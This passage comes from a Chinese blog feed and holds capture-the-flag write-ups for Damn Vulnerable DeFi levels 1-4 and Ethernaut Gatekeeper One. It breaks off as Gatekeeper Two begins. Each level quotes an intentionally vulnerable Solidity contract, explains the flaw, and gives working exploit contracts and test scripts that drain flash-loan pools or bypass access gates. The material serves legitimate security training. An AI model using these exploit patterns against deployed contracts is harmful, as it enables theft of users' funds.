        <content type="html"><![CDATA[<h1 id="Damn-Defi靶场刷题记录-1-4"><a href="#Damn-Defi靶场刷题记录-1-4" class="headerlink" title="Damn Defi靶场刷题记录(1-4)"></a>Damn Defi靶场刷题记录(1-4)</h1><pre><code>author: Thomas_Xu</code></pre><h2 id="Unstoppable"><a href="#Unstoppable" class="headerlink" title="Unstoppable"></a>Unstoppable</h2><p>这一关没有什么太大的难度，主要是带领进入Damn的题目</p><p>这道题是想让我们让这个闪电贷池停止工作</p><p>我们首先看一下合约<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> &#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;IERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;security&#x2F;ReentrancyGuard.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IReceiver &#123;</span><br><span class="line">    function receiveTokens(address tokenAddress, uint256 amount) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * @title UnstoppableLender</span><br><span class="line"> * @author Damn Vulnerable DeFi (https:&#x2F;&#x2F;damnvulnerabledefi.xyz)</span><br><span class="line"> *&#x2F;</span><br><span class="line">contract UnstoppableLender is ReentrancyGuard &#123;</span><br><span class="line"></span><br><span class="line">    IERC20 public immutable damnValuableToken;</span><br><span class="line">    uint256 public poolBalance;</span><br><span class="line"></span><br><span class="line">    constructor(address tokenAddress) &#123;</span><br><span class="line">        require(tokenAddress !&#x3D; address(0), &quot;Token address cannot be zero&quot;);</span><br><span class="line">        damnValuableToken &#x3D; IERC20(tokenAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function depositTokens(uint256 amount) external nonReentrant &#123;</span><br><span class="line">        require(amount &gt; 0, &quot;Must deposit at least one token&quot;);</span><br><span class="line">        &#x2F;&#x2F; Transfer token from sender. Sender must have first approved them.</span><br><span class="line">        damnValuableToken.transferFrom(msg.sender, address(this), amount);</span><br><span class="line">        poolBalance &#x3D; poolBalance + amount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(uint256 borrowAmount) external nonReentrant &#123;</span><br><span class="line">        require(borrowAmount &gt; 0, &quot;Must borrow at least one token&quot;);</span><br><span class="line"></span><br><span class="line">        uint256 balanceBefore &#x3D; damnValuableToken.balanceOf(address(this));</span><br><span class="line">        require(balanceBefore &gt;&#x3D; borrowAmount, &quot;Not enough tokens in pool&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Ensured by the protocol via the &#96;depositTokens&#96; function</span><br><span class="line">        assert(poolBalance &#x3D;&#x3D; balanceBefore);</span><br><span class="line">        </span><br><span class="line">        damnValuableToken.transfer(msg.sender, borrowAmount);</span><br><span class="line">        </span><br><span class="line">        IReceiver(msg.sender).receiveTokens(address(damnValuableToken), borrowAmount);</span><br><span class="line">        </span><br><span class="line">        uint256 balanceAfter &#x3D; damnValuableToken.balanceOf(address(this));</span><br><span class="line">        require(balanceAfter &gt;&#x3D; balanceBefore, &quot;Flash loan hasn&#39;t been paid back&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>可以注意到这个闪电贷函数是有明显问题的<br><code>assert(poolBalance == balanceBefore);</code>这个判断不严谨，poolBalance只有在调用depositTokens()函数存款时，才会增加，而如果我们通过ERC20的transfer来转账，balanceBefore余额会增加，但poolBalance并没有改变，这就会造成此闪电贷池宕机。</p><ul><li>解题步骤：<br>我们只需要向该合约提交一笔转账即可<br><code>await this.token.transfer(this.pool.address, INITIAL_ATTACKER_BALANCE, { from: attacker} );</code></li></ul><h2 id="naive-reciever"><a href="#naive-reciever" class="headerlink" title="naive-reciever"></a>naive-reciever</h2><p> 先看合约<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"> contract NaiveReceiverLenderPool is ReentrancyGuard &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    uint256 private constant FIXED_FEE &#x3D; 1 ether; &#x2F;&#x2F; not the cheapest flash loan</span><br><span class="line"></span><br><span class="line">    function fixedFee() external pure returns (uint256) &#123;</span><br><span class="line">        return FIXED_FEE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(address payable borrower, uint256 borrowAmount) external nonReentrant &#123;</span><br><span class="line"></span><br><span class="line">        uint256 balanceBefore &#x3D; address(this).balance;</span><br><span class="line">        require(balanceBefore &gt;&#x3D; borrowAmount, &quot;Not enough ETH in pool&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        require(address(borrower).isContract(), &quot;Borrower must be a deployed contract&quot;);</span><br><span class="line">        &#x2F;&#x2F; Transfer ETH and handle control to receiver</span><br><span class="line">        (bool success, ) &#x3D; borrower.call&#123;value: borrowAmount&#125;(</span><br><span class="line">            abi.encodeWithSignature(</span><br><span class="line">                &quot;receiveEther(uint256)&quot;,</span><br><span class="line">                FIXED_FEE</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        require(success, &quot;External call failed&quot;);</span><br><span class="line"></span><br><span class="line">        require(</span><br><span class="line">            address(this).balance &gt;&#x3D; balanceBefore.add(FIXED_FEE),</span><br><span class="line">            &quot;Flash loan hasn&#39;t been paid back&quot;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; Allow deposits of ETH</span><br><span class="line">    receive () external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li><strong>分析</strong><br>这个flashloan函数只要被调用一次就会抽取1ETH的小费，在这种时候，接收器必须要判断消息的发送者是否为自己，否则任何人都可以冒充接收器发送闪电贷请求。导致自己token的流失。</li></ul><ul><li><strong>Exploit</strong><br>只需要循环调用flashloan函数即可<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">for(let i &#x3D; 0; i &lt; 10; i++)&#123;</span><br><span class="line">            await this.pool.connect(attacker).flashLoan(this.receiver.address, &quot;0&quot;);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Truster"><a href="#Truster" class="headerlink" title="Truster"></a>Truster</h2><p>这又是一个关于外部调用的一个漏洞<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;IERC20.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;utils&#x2F;Address.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;security&#x2F;ReentrancyGuard.sol&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * @title TrusterLenderPool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https:&#x2F;&#x2F;damnvulnerabledefi.xyz)</span><br><span class="line"> *&#x2F;</span><br><span class="line">contract TrusterLenderPool is ReentrancyGuard &#123;</span><br><span class="line"></span><br><span class="line">    using Address for address;</span><br><span class="line"></span><br><span class="line">    IERC20 public immutable damnValuableToken;</span><br><span class="line"></span><br><span class="line">    constructor (address tokenAddress) &#123;</span><br><span class="line">        damnValuableToken &#x3D; IERC20(tokenAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(</span><br><span class="line">        uint256 borrowAmount,</span><br><span class="line">        address borrower,</span><br><span class="line">        address target,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    )</span><br><span class="line">        external</span><br><span class="line">        nonReentrant</span><br><span class="line">    &#123;</span><br><span class="line">        uint256 balanceBefore &#x3D; damnValuableToken.balanceOf(address(this));</span><br><span class="line">        require(balanceBefore &gt;&#x3D; borrowAmount, &quot;Not enough tokens in pool&quot;);</span><br><span class="line">        </span><br><span class="line">        damnValuableToken.transfer(borrower, borrowAmount);</span><br><span class="line">        target.functionCall(data);</span><br><span class="line"></span><br><span class="line">        uint256 balanceAfter &#x3D; damnValuableToken.balanceOf(address(this));</span><br><span class="line">        require(balanceAfter &gt;&#x3D; balanceBefore, &quot;Flash loan hasn&#39;t been paid back&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li><strong>分析</strong><br><code>ReentrancyGuard</code>并不是能让你安枕无忧的防止外部调用的方法，在这种特定情况下，最大的问题是允许指定与借款人合同不同的呼叫目标。</li><li><strong>Exploit</strong><br>我们注意到在此合约中指定了token地址，那么我们就可以获取到此token地址，通过借入的漏洞冒充pool池<code>approve</code>给我们一笔巨款，随后我们就可以把approve的这部分token拿到手。<br>攻击合约如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">import &quot;.&#x2F;TrusterLenderPool.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;IERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface ITrusterLenderPool&#123;</span><br><span class="line">    function flashLoan(uint256 borrowAmount, address borrower, address target, bytes calldata data) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TrusterExploit&#123;</span><br><span class="line">    ITrusterLenderPool cons;</span><br><span class="line">    uint256 balanceOfPool;</span><br><span class="line">    address tokenAdr;</span><br><span class="line">    address poolAdr;</span><br><span class="line">    constructor(address _pool, uint256 BalanceOfPool, address _token)&#123;</span><br><span class="line">        cons &#x3D; ITrusterLenderPool(_pool);</span><br><span class="line">        poolAdr &#x3D; _pool;</span><br><span class="line">        balanceOfPool &#x3D; BalanceOfPool;</span><br><span class="line">        tokenAdr &#x3D; _token;</span><br><span class="line">    &#125;</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        cons.flashLoan(0, msg.sender, tokenAdr, abi.encodeWithSignature(&quot;approve(address,uint256)&quot;, address(this), balanceOfPool));</span><br><span class="line">        IERC20 token &#x3D; IERC20(tokenAdr);</span><br><span class="line">        token.transferFrom(poolAdr, msg.sender,balanceOfPool);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">it(&#39;Exploit&#39;, async function () &#123;</span><br><span class="line">      &#x2F;** CODE YOUR EXPLOIT HERE  *&#x2F;</span><br><span class="line">      const attackconst &#x3D; await ethers.getContractFactory(&#39;TrusterExploit&#39;, attacker);</span><br><span class="line">      this.exploit &#x3D; await attackconst.deploy(this.pool.address, TOKENS_IN_POOL, this.token.address);</span><br><span class="line">      await this.exploit.connect(attacker).attack();</span><br><span class="line">      </span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure></li></ul><h2 id="side-entrance"><a href="#side-entrance" class="headerlink" title="side-entrance"></a>side-entrance</h2><p>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">import &quot;@openzeppelin&#x2F;contracts&#x2F;utils&#x2F;Address.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IFlashLoanEtherReceiver &#123;</span><br><span class="line">    function execute() external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * @title SideEntranceLenderPool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https:&#x2F;&#x2F;damnvulnerabledefi.xyz)</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">contract SideEntranceLenderPool &#123;</span><br><span class="line">    using Address for address payable;</span><br><span class="line"></span><br><span class="line">    mapping (address &#x3D;&gt; uint256) private balances;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        balances[msg.sender] +&#x3D; msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        uint256 amountToWithdraw &#x3D; balances[msg.sender];</span><br><span class="line">        balances[msg.sender] &#x3D; 0;</span><br><span class="line">        payable(msg.sender).sendValue(amountToWithdraw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(uint256 amount) external &#123;</span><br><span class="line">        uint256 balanceBefore &#x3D; address(this).balance;</span><br><span class="line">        require(balanceBefore &gt;&#x3D; amount, &quot;Not enough ETH in balance&quot;);</span><br><span class="line">        </span><br><span class="line">        IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;();</span><br><span class="line"></span><br><span class="line">        require(address(this).balance &gt;&#x3D; balanceBefore, &quot;Flash loan hasn&#39;t been paid back&quot;);    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ul><li><p><strong>分析</strong><br>通过阅读代码，我们可以明显的发现此题的flashloan的判断后缀条件有机可乘<code>require(address(this).balance &gt;= balanceBefore</code>这里检查的是当前合约的余额，而不是检查的借贷池里的余额，这导致我们可以通过存款<code>deposit</code>来伪造我们已经还款的事件。我们只需要在<code>receiver</code>里面存款，就可以使我们的balance不断增加。最后提款即可</p></li><li><p><strong>Expolit</strong><br>根据分析写出攻击合约：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;.&#x2F;SideEntranceLenderPool.sol&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; interface IFlashLoanEtherReceiver &#123;</span><br><span class="line">&#x2F;&#x2F;     function execute() external payable;</span><br><span class="line">&#x2F;&#x2F; &#125;</span><br><span class="line"></span><br><span class="line">contract SideEntranceExploit is IFlashLoanEtherReceiver&#123;</span><br><span class="line">    SideEntranceLenderPool pool;</span><br><span class="line">    address payable attacker;</span><br><span class="line">    constructor(address _pool)&#123;</span><br><span class="line">        pool &#x3D; SideEntranceLenderPool(_pool);</span><br><span class="line">        attacker &#x3D; payable(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint256 _amount) public&#123;</span><br><span class="line">        pool.flashLoan(_amount);</span><br><span class="line">        pool.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute() external payable override &#123;</span><br><span class="line">        pool.deposit&#123;value:address(this).balance&#125;();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    receive() external payable&#123;</span><br><span class="line">        attacker.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">it(&#39;Exploit&#39;, async function () &#123;</span><br><span class="line">        &#x2F;** CODE YOUR EXPLOIT HERE *&#x2F;</span><br><span class="line">        const sideEnranceExploit &#x3D; await ethers.getContractFactory(&#39;SideEntranceExploit&#39;, attacker);</span><br><span class="line">        this.exploit &#x3D; await sideEnranceExploit.deploy(this.pool.address);</span><br><span class="line">        await this.exploit.connect(attacker).attack(ETHER_IN_POOL);</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Damn Defi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ethernaut 题解 13-19</title>
      <link href="/2022-11-03-ethernaut03/"/>
      <url>/2022-11-03-ethernaut03/</url>
      
        <content type="html"><![CDATA[<h1 id="Ethernaut靶场刷题记录-13-19"><a href="#Ethernaut靶场刷题记录-13-19" class="headerlink" title="Ethernaut靶场刷题记录(13-19)"></a>Ethernaut靶场刷题记录(13-19)</h1><hr><pre><code>author：Thomas_Xu</code></pre><h2 id="13-Gatekeeper-One"><a href="#13-Gatekeeper-One" class="headerlink" title="13 Gatekeeper One"></a>13 Gatekeeper One</h2><p>这关主要是考查对solidity合约基础知识的了解。<br>先看代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#39;@openzeppelin&#x2F;contracts&#x2F;math&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender !&#x3D; tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(gasleft().mod(8191) &#x3D;&#x3D; 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) &#x3D;&#x3D; uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) !&#x3D; uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) &#x3D;&#x3D; uint16(tx.origin), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant &#x3D; tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>题目想要我们执行enter方法，并且要通过三个修饰器的检查。<br/><br>我们把三个修饰器分开来分析：</p><ul><li>require(msg.sender != tx.origin);<br>这个条件我们再之前做题的时候遇到过，只需要再调用函数时增加一个中间函数，就可以使<code>msg.sender != tx.origin</code></li><li>require(gasleft().mod(8191) == 0);这个条件会比较麻烦一点，gasleft函数返回的是交易剩余的gas量，所以我们只要让gas为8191*n+x即可，其中x为我们此次交易所消耗的gas。理论上来讲可以通过debug得到，但是由于不知道目标合约的编译器版本，所以无法精准得到这个值。但我们可以通过gas爆破来解决。毕竟gas毕竟是在一个范围区间之中的。</li><li><p>require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));<br>require(uint32(uint64(_gateKey)) != uint64(_gateKey));<br>require(uint32(uint64(_gateKey)) == uint16(tx.origin));<br>这个条件要求我们先了解solidity中类型转换的规则<a href="https://www.tutorialspoint.com/solidity/solidity_conversions.htm#:~:text=Solidity%20compiler%20allows%20implicit%20conversion,value%20not%20allowed%20in%20uint256." target="_blank" rel="noopener">参考链接</a><br/><br>这里以_gateKey是0x12345678deadbeef为例说明</p><blockquote><ol><li>uint32(uint64(_gateKey))转换后会取低位，所以变成0xdeadbeef，uint16(uint64(_gateKey))同理会变成0xbeef，uint16和uint32在比较的时候，较小的类型uint16会在左边填充0，也就是会变成0x0000beef和0xdeadbeef做比较，因此想通过第一个require只需要找一个形为0x????????0000????这种形式的值即可，其中?是任取值。</li><li>第二步要求双方不相等，只需高4个字节中任有一个bit不为0即可</li><li>通过前面可知，uint32(uint64(_gateKey))应该是类似0x0000beef这种形式，所以只需要让最低的2个byte和tx.origin地址最低的2个byte相同即可，也就是，key的最低2个字节设置为合约地址的低2个字节。这里tx.origin就是metamask的账户地址</li></ol></blockquote><p>攻击合约：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface GatekeeperOne &#123;</span><br><span class="line">    function entrant() external returns (address);</span><br><span class="line">    function enter(bytes8 _gateKey) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attack &#123;</span><br><span class="line">    GatekeeperOne gatekeeperOne;</span><br><span class="line">    address target;</span><br><span class="line">    address entrant;</span><br><span class="line"></span><br><span class="line">    event log(bool);</span><br><span class="line">    event logaddr(address);</span><br><span class="line"></span><br><span class="line">    constructor(address _addr) public &#123;</span><br><span class="line">        &#x2F;&#x2F; 设置为题目地址</span><br><span class="line">        target &#x3D; _addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function exploit() public &#123;</span><br><span class="line">        &#x2F;&#x2F; 后四位是metamask上账户地址的低2个字节</span><br><span class="line">        bytes8 key&#x3D;0xAAAAAAAA0000Ff67;</span><br><span class="line">        bool result;</span><br><span class="line">        for (uint256 i &#x3D; 0; i &lt; 120; i++) &#123;&#x2F;&#x2F;gas爆破</span><br><span class="line">            (bool result, bytes memory data) &#x3D; address(target).call&#123;gas:i + 150 + 8191 * 3&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;,key));</span><br><span class="line">            if (result) &#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        emit log(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getentrant() public &#123;</span><br><span class="line">        gatekeeperOne &#x3D; GatekeeperOne(target);</span><br><span class="line">        entrant &#x3D; gatekeeperOne.entrant();</span><br><span class="line">        emit logaddr(entrant);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>解题步骤<br>执行exploit方法后执行getentrant,可以在交易详细中看到提交上来的事务中address已经为我们的地址。通关</p></li></ul><h2 id="Gatekeeper-Two"><a href="#Gatekeeper-Two" class="headerlink" title="Gatekeeper Two"></a>Gatekeeper Two</h2><p>在做了第一道守门人后，这道题目看起来就easy很多了<br>先看代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 